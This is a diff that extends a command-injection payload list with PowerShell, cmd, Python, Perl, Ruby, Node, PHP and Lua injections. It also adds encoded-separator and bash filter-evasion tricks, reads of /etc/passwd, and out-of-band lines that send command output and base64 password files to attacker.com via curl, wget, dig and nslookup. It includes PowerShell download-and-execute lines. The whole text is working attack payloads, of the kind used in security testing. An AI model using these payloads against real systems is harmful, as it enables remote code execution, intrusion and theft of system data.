@@ -170,3 +170,83 @@ $(printf '\x69\x64')
 ; ?
 ;: ; id
 ;. /etc/passwd
+
+# ── POWERSHELL ──
+; powershell -c whoami
+; powershell -c "Get-Process"
+; powershell -c "Get-Content C:\Windows\win.ini"
+& powershell -c whoami
+| powershell -c whoami
+; powershell -enc dwBoAG8AYQBtAGkA
+; powershell -w hidden -c whoami
+; powershell -NoP -NonI -W Hidden -Exec Bypass -c whoami
+; powershell -c "(New-Object Net.WebClient).DownloadString('http://attacker.com/')"
+; powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/s.ps1')
+; powershell -c "Invoke-WebRequest http://attacker.com/?x=$(whoami)"
+; powershell -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((whoami)))"
+& cmd /c whoami
+& cmd.exe /c whoami
+; cmd.exe /c "whoami & ipconfig"
+; %SystemRoot%\system32\cmd.exe /c whoami
+; %COMSPEC% /c whoami
+
+# ── PYTHON/RUBY/PERL ──
+;python -c "import os;os.system('id')"
+;python3 -c "import os;os.system('id')"
+;python -c "__import__('os').system('id')"
+;python3 -c "__import__('subprocess').check_output('id',shell=True)"
+;perl -e "system('id')"
+;perl -e "exec('id')"
+;ruby -e "system('id')"
+;ruby -e "exec('id')"
+;node -e "require('child_process').exec('id',function(e,s){process.stdout.write(s)})"
+;php -r "system('id');"
+;lua -e "os.execute('id')"
+;tclsh <<< "exec id"
+
+# ── NULL BYTE / SEPARATOR TRICKS ──
+%00;id
+\x00;id
+;%0aid
+%0aid
+%0a id
+;id%0a
+%0a id %0a
+;id%00
+%3Bwhoami
+%7Cwhoami
+%26whoami
+%60id%60
+%24%28id%29
+
+# ── BASH ALTERNATIVE EXECUTION ──
+;{id}
+;{cat,/etc/passwd}
+;cat$IFS/etc/passwd
+;cat${IFS}/etc/passwd
+;cat</etc/passwd
+;$(cat</etc/passwd)
+;{whoami}>/tmp/ws_out
+;(id)
+;((id))
+;$@|id
+;id;#comment
+;id//comment
+;???????
+;/???/id
+;/???/cat /etc/passwd
+;/b?n/id
+;/bin/c?t /etc/p?sswd
+;$'\167\150\157\141\155\151'
+
+# ── OUT-OF-BAND DNS/HTTP EXTENDED ──
+;dig @attacker.com $(whoami).attacker.com
+;nslookup -type=A $(whoami).attacker.com attacker.com
+;host $(id|base64).attacker.com
+;curl -X POST http://attacker.com/ -d "$(id)"
+;curl -X POST http://attacker.com/ -d "$(cat /etc/passwd|base64)"
+;wget -q -O- http://attacker.com/?x=$(id|base64)
+;curl -s http://attacker.com/?c=$(cat /etc/passwd|base64 -w0)
+;python3 -c "import urllib.request;urllib.request.urlopen('http://attacker.com/?x='+__import__('subprocess').check_output('id',shell=True).decode())"
+& ping /n 1 attacker.com
+& nslookup attacker.com
